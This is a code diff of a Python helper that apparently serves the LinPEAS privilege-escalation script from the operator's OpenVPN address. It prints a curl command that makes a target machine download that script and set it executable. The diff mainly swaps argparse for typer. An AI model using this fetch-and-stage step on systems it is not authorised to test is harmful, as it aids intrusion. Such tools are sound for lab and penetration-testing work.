@@ -1,12 +1,13 @@
 import requests
 import os
-import argparse
 import socketserver
 import threading
 import netifaces as ni
 from utils.security import SecurityHTTPRequestHandler
 import psutil
 import json
+import typer
+from typing_extensions import Annotated
 
 # get config
 with open("./config.json", "r") as f:
@@ -41,45 +42,26 @@ def serve(port):
     with socketserver.TCPServer(("", port), handler) as httpd:
         httpd.serve_forever()
 
-def get_interface():
+def get_interface(interface):
     # this isnt perfect but will work
 
-    interfaces = psutil.net_if_addrs()
+    interfaces = psutil.net_if_addrs().keys()
 
-    if DEFAULT_INTERFACE in interfaces.keys():
+    if interface in interfaces:
+        return interface
+
+    if DEFAULT_INTERFACE in interfaces:
         return DEFAULT_INTERFACE
 
-    return next(iter(interfaces.keys()))
+    return next(iter(interfaces))
 
-def main():
-
-    # Step 0: parse arguments
-    parser = argparse.ArgumentParser(description='Provide the newest version of Linpeas!')
-
-    parser.add_argument('--port', 
-                        dest='port', 
-                        default=DEFAULT_PORT,
-                        type=int,
-                        help='The port which will be used. (--port=1337)')
-    
-    parser.add_argument('--inf', 
-                        dest='interface', 
-                        default=DEFAULT_INTERFACE,
-                        help='The network interface of the OpenVPN connection. (--inf=utun7)')
-    
-    parser.add_argument('--no-renew',
-                        dest='no_renew',
-                        action="store_false",
-                        help='If it should get the newest version of Linpeas.')
-
-    args = parser.parse_args()
-
-    port = args.port
-    interface = args.interface
-    renew_linpeas = args.no_renew
-
+def main(
+    port: Annotated[int, typer.Option(help="The port which will be used. (--port 1337)")] = DEFAULT_PORT,
+    inf: Annotated[str, typer.Option(help="The network interface of the OpenVPN connection. (--inf utun7)")] = DEFAULT_INTERFACE,
+    renew_linpeas: Annotated[bool, typer.Option("--no-renew", help="If it should get the newest version of Linpeas. (--no-renew)")] = False,
+):
     # Step 1: get Linpeas
-    if renew_linpeas:
+    if not renew_linpeas:
         print("Getting Linpeas...")
         get_linpeas()
 
@@ -88,10 +70,10 @@ def main():
     t.start()
 
     # Step 3: get IP from OpenVPN Connection
-    ip = ni.ifaddresses(get_interface())[ni.AF_INET][0]['addr']
+    ip = ni.ifaddresses(get_interface(inf))[ni.AF_INET][0]['addr']
 
     # Step 4: provide user with information
     print(f"Get linpeas with: curl -L http://{ip}:{port}/l.sh > l.sh | chmod +x l.sh")
 
 if __name__ == "__main__":
-    main()
+    main(1234, "en0", False) # for testing and debbuging
